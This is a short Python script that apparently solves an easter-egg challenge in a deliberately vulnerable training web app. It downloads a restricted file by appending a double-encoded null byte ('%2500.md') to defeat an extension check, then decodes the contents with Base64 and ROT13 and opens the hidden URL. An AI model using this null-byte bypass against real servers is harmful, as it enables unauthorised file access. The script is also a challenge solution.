import json
import codecs
from base64 import b64decode
import requests
import webbrowser

def download_file(server, filename):
    url= '{}/ftp/{}%2500.md'.format(server,filename) #the file is filename%00.md, % is expressed in %25
    r =requests.get(url)
    if not r.ok:
        raise RuntimeError('download file error.')
    return r

def get_real_easter_egg_text(server):
    eggfile =download_file(server,'eastere.gg').content
    lines =eggfile.split()
    string = ''
    for i in lines:
        if len(i)>len(string):
            string = i  
    return string
def decrypt_easter_egg(server):
    print('Fetching read egg text from eastere.gg')
    egg = get_real_easter_egg_text(server)
    print('Easter egg text: {}'.format(egg))
    partial = b64decode(egg)
    print('After Base 64 decoding: {}'.format(partial))
    actual = codecs.encode(partial, 'rot_13')
    print('After ROT13 decoding: {}'.format(actual))
    eggurl = '{}{}'.format(server, actual)
    print('Opening {}...'.format(eggurl)),
    webbrowser.open_new(eggurl)
    print('Success.')

server = 'https://your/url.com/'
print 'Get and Decrypt easter egg'
decrypt_easter_egg(server)
